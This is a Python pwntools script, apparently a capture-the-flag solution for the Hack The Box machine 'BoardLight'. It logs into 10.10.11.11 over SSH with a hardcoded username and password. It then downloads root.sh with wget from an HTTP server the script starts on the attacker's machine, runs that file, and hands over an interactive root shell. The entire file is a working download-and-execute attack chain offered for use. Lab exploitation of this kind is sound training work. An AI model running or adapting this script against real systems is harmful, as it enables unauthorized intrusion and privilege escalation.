import requests
import socket
from pwn import *
import threading
import os
import time
import subprocess

print("\n[\033[1;32m+\033[1;37m] BoardLight - Ninhpn1337\n")
time.sleep(1)

def server():
    subprocess.run(["python3", "-m", "http.server", "8025"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

time.sleep(1)

def get_user_input():
    # IPVPN
    print("\n[\033[1;32m+\033[1;37m] Please input your HTB IP - tun0 and we will get root :)")
    ip_address = input("\n[\033[1;32m+\033[1;37m] HTB IP: ")
    
    return ip_address




threading.Thread(target=server, args=()).start()


ip_address = get_user_input()


request = ssh(host="10.10.11.11", user="larissa", password="serverfun2$2023!!")
shell = request.process("/bin/sh")
shell.sendline(b"whoami")
time.sleep(0.5)
command = f"wget {ip_address}:8025/root.sh"  
shell.sendline(command.encode())
time.sleep(0.5)
shell.sendline(b"chmod +x root.sh")
time.sleep(0.5)
shell.sendline(b"./root.sh")
time.sleep(0.5)
print("\n[\033[1;32m+\033[1;37m] Execution whoami")
shell.sendline(b"echo whoami")
shell.sendline(b"whoami")
shell.interactive()
